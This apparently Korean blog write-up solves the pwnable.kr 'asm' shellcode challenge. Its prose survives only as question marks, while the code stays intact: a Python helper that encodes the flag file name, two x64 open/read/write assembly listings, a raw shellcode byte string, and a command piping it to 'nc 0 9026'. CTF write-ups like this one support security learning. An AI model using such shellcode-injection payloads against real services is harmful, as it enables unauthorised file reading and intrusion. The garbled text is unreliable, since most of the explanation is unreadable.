---

layout: post

title: ! "Pwnable.kr ASM"

excerpt_separator: <!--more-->

tags:

 - Write-up

 - pwnable.kr

 - shellcode

---
Pwnable.kr asm
===============


??????. ??????. ??? ??? ??? ????? shell code? ????? ?? ? ??? ??? ??? ?????.

?? asm??? asm.c ?? ??? ??? "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong" ??, readme??? ????. 
?? ??? ? ??? ??? ??????.
??? asm? ?????? read, write, open ??? ???? 64bit ???? ????? ??. 
??? ??? ?? ??? ???? ???? c? ??? ?????.

```cpp
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
int main()
{
	int fd;
	char buf[1024];
fd = open("./this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong", O_RDONLY);
	read(fd, buf, 1024);
	write(1, buf, 1024);
//	puts(buf);
	return ;
	
}
```
???? c??? ????? ???
?? python ??? ?? ? flag ??? ??? ? ?? little endian ???? ??? ??? ??.
? ??? x64??? ?? ? x64? mov ? 16bit? ??? ? ?? ???
?? ?? rax?? ?? rax? push ?? ???? ???? ??.


?? python ??? ??

```python
a = "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong".encode("hex")
b=[]
c=[]
for i in range(0,len(a)/2+1):
    b.append(a[i*2:i*2+2])
    #b[i] = "\\x"+b[i]
    
b.reverse()
#print(b)

for j in range(0,len(b)/8):
    c.append(b[j*8]+b[j*8+1]+b[j*8+2]+b[j*8+3]+b[j*8+4]+b[j*8+5]+b[j*8+6]+b[j*8+7])
h=0
for k in c:
    print "mov rax, 0x"+k
    print "push rax"
   ```
? ???? ??? ??? ?? ? ?? ??? ?? ? ??.

```assembly
section .data
section .bss
buf: resb 4
section .text

global _start

_start:
	push rbp
	mov rbp, rsp
	mov rax, 0x676e6f306f306f30
	push rax
	mov rax, 0x6f306f306f306f30
	push rax
	mov rax, 0x3030303030303030
	push rax
	mov rax, 0x3030306f6f6f6f6f
	push rax
	mov rax, 0x6f6f6f6f6f6f6f6f
	push rax
	mov rax, 0x6f6f6f6f6f6f6f6f
	push rax
	mov rax, 0x6f6f303030303030
	push rax
	mov rax, 0x3030303030303030
	push rax
	mov rax, 0x3030303030303030
	push rax
	mov rax, 0x3030306f6f6f6f6f
	push rax
	mov rax, 0x6f6f6f6f6f6f6f6f
	push rax
	mov rax, 0x6f6f6f6f6f6f6f6f
	push rax
	mov rax, 0x6f6f6f6f6f6f6f6f
	push rax
	mov rax, 0x6f6f6f6f6f6f6f6f
	push rax
	mov rax, 0x6f6f6f6f6f6f6f6f
	push rax
	mov rax, 0x6f6f6f6f6f6f6f6f
	push rax
	mov rax, 0x6f6f6f6f6f6f6f6f
	push rax
	mov rax, 0x6f6f6f6f6f6f6f6f
	push rax
	mov rax, 0x6f6f6f6f6f6f6f6c
	push rax
	mov rax, 0x5f797265765f7369
	push rax
	mov rax, 0x5f656d616e5f656c
	push rax
	mov rax, 0x69665f6568745f79
	push rax
	mov rax, 0x72726f732e656c69
	push rax
	mov rax, 0x665f736968745f64
	push rax
	mov rax, 0x6165725f65736165
	push rax
	mov rax, 0x6c705f656c69665f
	push rax
	mov rax, 0x67616c665f726b2e
	push rax
	mov rax, 0x656c62616e77705f
	push rax

	mov rdx, 0x0
	mov rsi, 0x0
	mov rdi, rsp
	mov rax, 2
	syscall	

	mov rdi, rax
	mov rsi, buf
	mov rdx, 100
	mov rax, 0
	syscall

	mov rdi, 1
	mov rsi, buf
	mov rdx, 100
	mov rax, 1
	syscall 	
```
??? ??? ?? ??? read, write, open? ???? ?? ???? flag? ?? ? ? ?? ?? ??? ????.
???? ??? ? ??? ?? pwnable?? ??? ??? ??? ??? ??.

??? ??? ???? ??? ??? ??.
?? ????? null ?? ?? ???? ??? ? ????? null? ????? ??.

?? ??? ?????? ?? ???? ??? buf ?? ??? ??? ????? ?? ??? ????? ???? c ??? ?? 

``
char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);
`` ?? ??? ????? ????? ??.

??? ???
```avrasm 
section .data
section .bss
buf: resb 4
section .text

global _start

_start:
mov rax, 0x676e6f306f306f
push rax
mov rax, 0x306f306f306f306f
push rax
mov rax, 0x3030303030303030
push rax
mov rax, 0x303030306f6f6f6f
push rax
mov rax, 0x6f6f6f6f6f6f6f6f
push rax
mov rax, 0x6f6f6f6f6f6f6f6f
push rax
mov rax, 0x6f6f6f3030303030
push rax
mov rax, 0x3030303030303030
push rax
mov rax, 0x3030303030303030
push rax
mov rax, 0x303030306f6f6f6f
push rax
mov rax, 0x6f6f6f6f6f6f6f6f
push rax
mov rax, 0x6f6f6f6f6f6f6f6f
push rax
mov rax, 0x6f6f6f6f6f6f6f6f
push rax
mov rax, 0x6f6f6f6f6f6f6f6f
push rax
mov rax, 0x6f6f6f6f6f6f6f6f
push rax
mov rax, 0x6f6f6f6f6f6f6f6f
push rax
mov rax, 0x6f6f6f6f6f6f6f6f
push rax
mov rax, 0x6f6f6f6f6f6f6f6f
push rax
mov rax, 0x6f6f6f6f6f6f6f6f
push rax
mov rax, 0x6c5f797265765f73
push rax
mov rax, 0x695f656d616e5f65
push rax
mov rax, 0x6c69665f6568745f
push rax
mov rax, 0x7972726f732e656c
push rax
mov rax, 0x69665f736968745f
push rax
mov rax, 0x646165725f657361
push rax
mov rax, 0x656c705f656c6966
push rax
mov rax, 0x5f67616c665f726b
push rax
mov rax, 0x2e656c62616e7770
push rax
mov rax, 0x5f73695f73696874
push rax
	


	mov rdx, 0x0
	mov rsi, 0x0
	mov rdi, rsp
	mov rax, 2
	syscall	

	mov rdi, rax
	mov rsi, 0x41414800
	mov rdx, 100
	mov rax, 0
	syscall

	mov rdi, 1
	mov rsi, 0x41414800
	mov rdx, 100
	mov rax, 1
	syscall
```

?? ??? ???? ??? ?? ??.

objdump -D '?????' ? ???? ???? ???? ??? ????? ???
??? ????? 
https://defuse.ca/online-x86-assembler.htm ???? ?? ??? ?????? ??? ???? ??? ? ??.

??? ?????? ?? ?? ??? pwnable ??? ??? ??? ??? ??????? ??.
```python
a = "\x48\xB8\x6F\x30\x6F\x30\x6F\x6E\x67\x00\x50\x48\xB8\x6F\x30\x6F\x30\x6F\x30\x6F\x30\x50\x48\xB8\x30\x30\x30\x30\x30\x30\x30\x30\x50\x48\xB8\x6F\x6F\x6F\x6F\x30\x30\x30\x30\x50\x48\xB8\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x50\x48\xB8\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x50\x48\xB8\x30\x30\x30\x30\x30\x6F\x6F\x6F\x50\x48\xB8\x30\x30\x30\x30\x30\x30\x30\x30\x50\x48\xB8\x30\x30\x30\x30\x30\x30\x30\x30\x50\x48\xB8\x6F\x6F\x6F\x6F\x30\x30\x30\x30\x50\x48\xB8\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x50\x48\xB8\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x50\x48\xB8\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x50\x48\xB8\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x50\x48\xB8\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x50\x48\xB8\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x50\x48\xB8\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x50\x48\xB8\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x50\x48\xB8\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x50\x48\xB8\x73\x5F\x76\x65\x72\x79\x5F\x6C\x50\x48\xB8\x65\x5F\x6E\x61\x6D\x65\x5F\x69\x50\x48\xB8\x5F\x74\x68\x65\x5F\x66\x69\x6C\x50\x48\xB8\x6C\x65\x2E\x73\x6F\x72\x72\x79\x50\x48\xB8\x5F\x74\x68\x69\x73\x5F\x66\x69\x50\x48\xB8\x61\x73\x65\x5F\x72\x65\x61\x64\x50\x48\xB8\x66\x69\x6C\x65\x5F\x70\x6C\x65\x50\x48\xB8\x6B\x72\x5F\x66\x6C\x61\x67\x5F\x50\x48\xB8\x70\x77\x6E\x61\x62\x6C\x65\x2E\x50\x48\xB8\x74\x68\x69\x73\x5F\x69\x73\x5F\x50\x48\xC7\xC2\x00\x00\x00\x00\x48\xC7\xC6\x00\x00\x00\x00\x48\x89\xE7\x48\xC7\xC0\x02\x00\x00\x00\x0F\x05\x48\x89\xC7\x48\xC7\xC6\x00\x48\x41\x41\x48\xC7\xC2\x64\x00\x00\x00\x48\xC7\xC0\x00\x00\x00\x00\x0F\x05\x48\xC7\xC7\x01\x00\x00\x00\x48\xC7\xC6\x00\x48\x41\x41\x48\xC7\xC2\x64\x00\x00\x00\x48\xC7\xC0\x01\x00\x00\x00\x0F\x05"

import sys

sys.stdout.write(a)
```

??? ?? ??? ???  tmp??? ???? ?? ??? ??? ??? ???? ? ?? asm? ??? fake flag?? ??.
??? readme ??? ????? nc 0 9026?? ????? ???.

??? ??? python /tmp/????? ??/?? ??.py | nc 0 9026 ? ??? ?? ??? ??? ???? ???.
  
 